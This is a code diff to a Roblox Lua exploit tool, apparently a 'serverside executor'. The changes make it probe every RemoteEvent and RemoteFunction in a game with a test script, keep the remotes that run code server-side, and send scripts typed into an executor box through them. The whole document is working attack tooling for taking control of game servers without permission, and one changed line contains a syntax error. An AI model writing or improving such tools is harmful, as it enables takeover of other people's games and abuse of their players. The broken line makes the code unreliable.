@@ -89,6 +89,37 @@ local function updateScanningText()
     G2L["statusText"].Text = "Scanning" .. string.rep(".", scanningDots)
 end
 
+-- Function to test if a remote can execute require statements
+local function testRequireCapability(remote)
+    local testScript = [[
+        local success, result = pcall(function()
+            return require(game:GetService("HttpService"))
+        end)
+        return success and type(result) == "table"
+    ]]
+    
+    local success, canRequire = pcall(function()
+        if remote:IsA("RemoteEvent") then
+            remote:FireServer(testScript)
+            return true
+        elseif remote:IsA("RemoteFunction") then
+            return remote:InvokeServer(testScript)
+        end
+        return false
+    end)
+    
+    return success and canRequire == true
+end
+
+-- Function to execute a script through a backdoor
+local function executeScript(remote, scriptText)
+    if remote:IsA("RemoteEvent") then
+        remote:FireServer(scriptText)
+    elseif remote:IsA("RemoteFunction") then
+        return remote:InvokeServer(scriptText)
+    end
+end
+
 local function scanForRemotes()
     local startTime = tick()
     G2L["scanBtn"].Visible = false
@@ -103,36 +134,36 @@ local function scanForRemotes()
     end
     
     local foundRemotes = {}
-    local services = game:GetDescendants()
+    local requireCapableRemotes = {}
     
-    local backdoorPatterns = {
-        "admin", "control", "system", "execute", "command", 
-        "script", "remote", "function", "event", "backdoor",
-        "server", "client", "request", "fire", "invoke"
-    }
+    -- Scan the entire game for remotes
+    G2L["statusText"].Text = "Scanning all remotes..."
     
-    for _, instance in pairs(services) do
+    local allInstances = game:GetDescendants()
+    table.insert(allInstances, game:GetService("ReplicatedStorage"))
+    table.insert(allInstances, game:GetService("ServerScriptService"))
+    table.insert(allInstances, game:GetService("ServerStorage"))
+    table.insert(allInstances, game:GetService("Workspace"))
+    table.insert(allInstances, game:GetService("Lighting"))
+    table.insert(allInstances, game:GetService("StarterPack"))
+    table.insert(allInstances, game:GetService("StarterGui"))
+    table.insert(allInstances, game:GetService("StarterPlayer"))
+    
+    for _, instance in pairs(allInstances) do
         if instance:IsA("RemoteEvent") or instance:IsA("RemoteFunction") then
-            local nameLower = string.lower(instance.Name)
-            local pathLower = string.lower(instance:GetFullName())
-            
-            local isMajorBackdoor = false
-            
-            for _, pattern in ipairs(backdoorPatterns) do
-                if string.find(nameLower, pattern) or string.find(pathLower, pattern) then
-                    isMajorBackdoor = true
-                    break
-                end
-            end
-            
-            local parent = instance.Parent
-            if parent and (parent.Name == "Workspace" or parent.Name == "Lighting" or parent.Name == "ReplicatedStorage") then
-                isMajorBackdoor = true
-            end
-            
-            if isMajorBackdoor then
-                table.insert(foundRemotes, instance)
-            end
+            table.insert(foundRemotes, instance)
+        end
+    end
+    
+    G2L["statusText"].Text = "Found " .. #foundRemotes .. " remotes, testing for require capability..."
+    
+    -- Test each remote for require capability
+    for i, remote in ipairs(foundRemotes) do
+        G2L["progressFill"].Size = UDim2.new(i/#foundRemotes, 0, 1, 0)
+        
+        if testRequireCapability(remote) then
+            table.insert(requireCapableRemotes, remote)
+            G2L["statusText"].Text = "Found require-capable remote: " .. remote:GetFullName()
         end
     end
     
@@ -140,14 +171,19 @@ local function scanForRemotes()
     
     local scanTime = string.format("%.2f", tick() - startTime)
     
-    if #foundRemotes > 0 then
-        G2L["statusText"].Text = "Found " .. #foundRemotes .. " potential backdoors in " .. scanTime .. "s!"
+    if #requireCapableRemotes > 0 then
+        G2L["statusText"].Text = "Found " .. #requireCapableRemotes .. " require-capable backdoors in " .. scanTime .. "s!"
         
         wait(1.5)
         G2L["preloader"]:Destroy()
-        createMainUI(foundRemotes, scanTime)
+        createMainUI(requireCapableRemotes, scanTime)
+    elseif #foundRemotes > 0 then
+        G2L["statusText"].Text = "Found " .. #foundRemotes .. " remotes but none can run require in " .. scanTime .. "s!"
+        
+        wait(2)
+        G2L["preloader"]:Destroy()
     else
-        G2L["statusText"].Text = "No Backdoor :("
+        G2L["statusText"].Text = "No remotes found :("
         G2L["progressBg"].Visible = false
         G2L["progressFill"].Size = UDim2.new(0, 0, 1, 0)
         
@@ -174,8 +210,8 @@ function createMainUI(foundRemotes, scanTime)
 
     G2L["2"] = Instance.new("Frame", G2L["1"])
     G2L["2"].BackgroundColor3 = Color3.fromRGB(15, 15, 15)
-    G2L["2"].Size = UDim2.new(0, 350, 0, 300)
-    G2L["2"].Position = UDim2.new(0.5, -175, 0.5, -150)
+    G2L["2"].Size = UDim2.new(0, 500, 0, 400)
+    G2L["2"].Position = UDim2.new(0.5, -250, 0.5, -200)
     G2L["2"].ClipsDescendants = true
 
     G2L["3"] = Instance.new("UIStroke", G2L["2"])
@@ -241,8 +277,8 @@ function createMainUI(foundRemotes, scanTime)
         tab.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
         tab.Font = Enum.Font.Gotham
         tab.TextSize = 12
-        tab.Size = UDim2.new(0, 80, 0, 25)
-        tab.Position = UDim2.new(0, 10 + (i-1)*90, 0, 40)
+        tab.Size = UDim2.new(0, 100, 0, 25)
+        tab.Position = UDim2.new(0, 10 + (i-1)*110, 0, 40)
         tab.AutoButtonColor = false
         
         local tabCorner = Instance.new("UICorner", tab)
@@ -257,7 +293,7 @@ function createMainUI(foundRemotes, scanTime)
 
     G2L["contentFrame"] = Instance.new("Frame", G2L["2"])
     G2L["contentFrame"].BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-    G2L["contentFrame"].Size = UDim2.new(1, -20, 0, 220)
+    G2L["contentFrame"].Size = UDim2.new(1, -20, 0, 320)
     G2L["contentFrame"].Position = UDim2.new(0, 10, 0, 75)
     
     G2L["contentCorner"] = Instance.new("UICorner", G2L["contentFrame"])
@@ -280,7 +316,7 @@ function createMainUI(foundRemotes, scanTime)
     G2L["executorBox"].TextColor3 = Color3.fromRGB(220, 220, 220)
     G2L["executorBox"].Font = Enum.Font.RobotoMono
     G2L["executorBox"].TextSize = 12
-    G2L["executorBox"].Size = UDim2.new(1, -20, 0, 150)
+    G2L["executorBox"].Size = UDim2.new(1, -20, 0, 200)
     G2L["executorBox"].Position = UDim2.new(0, 10, 0, 10)
     G2L["executorBox"].ClearTextOnFocus = false
     G2L["executorBox"].Text = ""
@@ -288,7 +324,7 @@ function createMainUI(foundRemotes, scanTime)
     G2L["executorBox"].MultiLine = true
     G2L["executorBox"].TextXAlignment = Enum.TextXAlignment.Left
     G2L["executorBox"].TextYAlignment = Enum.TextYAlignment.Top
-    G2L["executorBox"].PlaceholderText = "-- Serverside script executor\n-- Found " .. #foundRemotes .. " potential backdoors\n\nprint('Hello from serverside!')"
+    G2L["executorBox"].PlaceholderText = "-- Serverside script executor\n-- Found " .. #foundRemotes .. " require-capable backdoors\n\nprint('Hello from serverside!')\n\n-- You can use require() here\nlocal http = game:GetService('HttpService')\nprint(http)\n\n-- Example: Get all players\nfor i, player in pairs(game:GetService('Players'):GetPlayers()) do\n    print(player.Name)\nend"
     
     G2L["executorBoxCorner"] = Instance.new("UICorner", G2L["executorBox"])
     G2L["executorBoxCorner"].CornerRadius = UDim.new(0, 6)
@@ -298,9 +334,8 @@ function createMainUI(foundRemotes, scanTime)
     G2L["executorBoxStroke"].Thickness = 1
 
     local execButtons = {
-        {Name = "Execute", Color = Color3.fromRGB(0, 100, 200), Position = UDim2.new(0, 10, 0, 170)},
-        {Name = "Clear", Color = Color3.fromRGB(200, 50, 50), Position = UDim2.new(0, 90, 0, 170)},
-        {Name = "Save", Color = Color3.fromRGB(50, 150, 50), Position = UDim2.new(0, 170, 0, 170)}
+        {Name = "Execute", Color = Color3.fromRGB(0, 100, 200), Position = UDim2.new(0, 10, 0, 220)},
+        {Name = "Clear", Color = Color3.fromRGB(200, 50, 50), Position = UDim2.new(0, 100, 0, 220)}
     }
     
     for _, btnInfo in ipairs(execButtons) do
@@ -310,7 +345,7 @@ function createMainUI(foundRemotes, scanTime)
         btn.BackgroundColor3 = btnInfo.Color
         btn.Font = Enum.Font.GothamBold
         btn.TextSize = 12
-        btn.Size = UDim2.new(0, 70, 0, 25)
+        btn.Size = UDim2.new(0, 80, 0, 25)
         btn.Position = btnInfo.Position
         btn.AutoButtonColor = false
         
@@ -321,17 +356,17 @@ function createMainUI(foundRemotes, scanTime)
             btn.MouseButton1Click:Connect(function()
                 local scriptText = G2L["executorBox"].Text
                 if scriptText ~= "" then
-                    pcall(function()
-                        loadstring(scriptText)()
-                    end)
+                    -- Use the first found require-capable remote to execute
+                    local remote = foundRemotes[1]
+                    if remote then
+                        G2L["statusText"].Text = "Executing via " .. remote:GetFullName()
+                        executeScript(remote, scriptText)
+                    end
                 end
             end)
         elseif btnInfo.Name == "Clear" then
             btn.MouseButton1Click:Connect(function()
                 G2L["executorBox"].Text = ""
-            end)
-        elseif btnInfo.Name == "Save" then
-            btn.MouseButton1Click:Connect(function()
             end)
         end
         
@@ -350,13 +385,13 @@ function createMainUI(foundRemotes, scanTime)
     G2L["remotesTab"].Position = UDim2.new(0, 0, 0, 0)
     G2L["remotesTab"].ScrollBarThickness = 6
     G2L["remotesTab"].Visible = false
-    G2L["remotesTab"].CanvasSize = UDim2.new(0, 0, 0, #foundRemotes * 30)
+    G2L["remotesTab"].CanvasSize = UDim2.new(0, 0, 0, #foundRemotes * 40)
     
     for i, remote in ipairs(foundRemotes) do
         local remoteFrame = Instance.new("Frame", G2L["remotesTab"])
         remoteFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
-        remoteFrame.Size = UDim2.new(1, -20, 0, 25)
-        remoteFrame.Position = UDim2.new(0, 10, 0, (i-1)*30 + 10)
+        remoteFrame.Size = UDim2.new(1, -20, 0, 35)
+        remoteFrame.Position = UDim2.new(0, 10, 0, (i-1)*40 + 10)
         
         local remoteCorner = Instance.new("UICorner", remoteFrame)
         remoteCorner.CornerRadius = UDim.new(0, 6)
@@ -372,8 +407,19 @@ function createMainUI(foundRemotes, scanTime)
         remoteLabel.TextXAlignment = Enum.TextXAlignment.Left
         remoteLabel.TextTruncate = Enum.TextTruncate.AtEnd
         
+        local pathLabel = Instance.new("TextLabel", remoteFrame)
+        pathLabel.Text = remote:GetFullName()
+        pathLabel.TextColor3 = Color3.fromRGB(150, 150, 150)
+        pathLabel.BackgroundTransparency = 1
+        pathLabel.Font = Enum.Font.Gotham
+        pathLabel.TextSize = 8
+        pathLabel.Size = UDim2.new(0.7, 0, 0.5, 0)
+        pathLabel.Position = UDim2.new(0, 5, 0.5, 0)
+        pathLabel.TextXAlignment = Enum.TextXAlignment.Left
+        pathLabel.TextTruncate = Enum.TextTruncate.AtEnd
+        
         local fireBtn = Instance.new("TextButton", remoteFrame)
-        fireBtn.Text = "Fire"
+        fireBtn.Text = "Execute"
         fireBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
         fireBtn.BackgroundColor3 = Color3.fromRGB(0, 100, 200)
         fireBtn.Font = Enum.Font.GothamBold
@@ -385,11 +431,8 @@ function createMainUI(foundRemotes, scanTime)
         fireCorner.CornerRadius = UDim.new(0, 4)
         
         fireBtn.MouseButton1Click:Connect(function()
-            if remote:IsA("RemoteEvent") then
-                remote:FireServer()
-            elseif remote:IsA("RemoteFunction") then
-                remote:InvokeServer()
-            end
+            local testScript = "print('Executed via " .. remote:GetFullName() .. "')"
+            executeScript(remote, testScript)
         end)
     end
 
@@ -404,7 +447,6 @@ function createMainUI(foundRemotes, scanTime)
     local settings = {
         {Name = "Destroy GUI", Color = Color3.fromRGB(200, 50, 50)},
         {Name = "Rejoin Server", Color = Color3.fromRGB(0, 100, 200)},
-        {Name = "Server Hop", Color = Color3.fromRGB(50, 150, 50)},
         {Name = "Copy Discord", Color = Color3.fromRGB(100, 100, 200)}
     }
     
@@ -447,6 +489,16 @@ function createMainUI(foundRemotes, scanTime)
         end)
     end
 
+    G2L["statusText"] = Instance.new("TextLabel", G2L["2"])
+    G2L["statusText"].Text = "Ready - " .. #foundRemotes .. " require-capable backdoors found"
+    G2L["statusText"].TextColor3 = Color3.fromRGB(150, 150, 150)
+    G2L["statusText"].BackgroundTransparency = 1
+    G2L["statusText"].Font = Enum.Font.Gotham
+    G2L["statusText"].TextSize = 12
+    G2L["statusText"].Size = UDim2.new(1, -20, 0, 20)
+    G2L["statusText"].Position = UDim2.new(0, 10, 1, -25)
+    G2L["statusText"].TextXAlignment = Enum.TextXAlignment.Left
+
     local function switchTab(tabName)
         G2L["executorTab"].Visible = (tabName == "Executor")
         G2L["remotesTab"].Visible = (tabName == "Remotes")
@@ -463,7 +515,7 @@ function createMainUI(foundRemotes, scanTime)
         end
     end
 
-    for tabName, tab in pairs(G2L["tabs"]) do
+    for tabName, tab in pairs(G2L["tabs") do
         tab.MouseButton1Click:Connect(function()
             switchTab(tabName)
         end)
